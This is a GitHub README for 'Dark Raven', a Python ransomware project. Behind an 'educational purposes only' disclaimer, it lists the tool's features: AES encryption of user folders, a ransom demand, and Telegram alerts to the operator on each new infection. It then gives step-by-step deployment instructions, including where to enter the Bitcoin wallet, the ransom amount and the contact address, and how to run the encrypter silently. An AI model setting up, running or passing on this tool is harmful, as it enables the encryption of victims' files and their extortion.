# Ransomeware Python Project
## Dark Raven v1.5.4


**This Ransomeware is for educational purposes only. It should not be used to harm or exploit others' computers.
The purpose of this program is to promote understanding and awareness of malware, cryptography, operating systems, and programming. It serves as a learning tool to explore security concepts and cryptographic techniques.**

> [!CAUTION]
> By default Encrypter.py is configured to encrypt C:\Users\
> If you don't trust it, read the source.

> [!IMPORTANT]
> This is a smaller rewrite of the original. 
> I do not provide support for this. You should know what you are doing.

-----------------------------------------------------------------------------------------------------------------------------

![image](https://github.com/APT3233/Crypter/blob/main/Visual_Data/Screenshot%202024-04-05%20083732.png)


## Environement:
- Windows 10 | Tested | Compiled
- Windows 11 | Tested | Compiled
- Linux (Updating)
- Python 3.6 above


## Feature:
- Encryption: Ransomware uses the AES encryption algorithm to encrypt files and folders on the victim's computer.
- Ransom Demand: Ransomware displays a message demanding the victim pay a ransom fee in exchange for a decryption key.
- Telegram API: Ransomware might integrate with the Telegram API to notify the hacker when a new computer is infected.

## Usage:
### Download Crypter 
```
git clone https://github.com/APT3233/Crypter.git
```
### Move to folder 
```
cd Crypter
```
### Fill in the following information
```init
self.api = 'YOUR_API'
self.chat_id = 'YOUR_CHAT_ID'
self.ransomware = True
self.ransomware_email_address = 'THANK@YOU.COM'
self.ransomware_btc_wallet_adress = "YOUR_BTC_ADDRESS"
self.ransomware_amount_of_money = "AMOUNT_OF_MONEY"
```

### Install Modules 
```
pip install -r requirements.txt
```
### Run file 
```
pythonw Encrypter.py
```

                                                
